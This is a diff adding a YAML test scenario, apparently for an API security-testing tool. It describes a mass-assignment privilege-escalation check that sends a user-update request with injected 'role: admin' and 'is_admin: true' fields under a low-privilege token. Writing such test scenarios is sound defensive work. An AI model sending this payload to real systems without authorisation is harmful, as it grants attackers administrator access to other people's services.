@@ -1,0 +1,20 @@
+name: mass-assignment-role
+description: "Mass assignment — inject role field into user update request to escalate privileges"
+mitre_technique_ids: ["T1548"]
+tags: [api, owasp-a3, mass-assignment, privilege-escalation]
+severity: high
+timeout: 1m
+steps:
+  - kind: mass_assignment
+    params:
+      endpoint: /api/v1/users/me
+      method: PUT
+      base_payload:
+        name: "Test User"
+        email: "test@example.com"
+      injected_fields:
+        role: admin
+        is_admin: true
+      auth_token_param: low_privilege_jwt
+      success_indicator:
+        response_contains: '"role":"admin"'
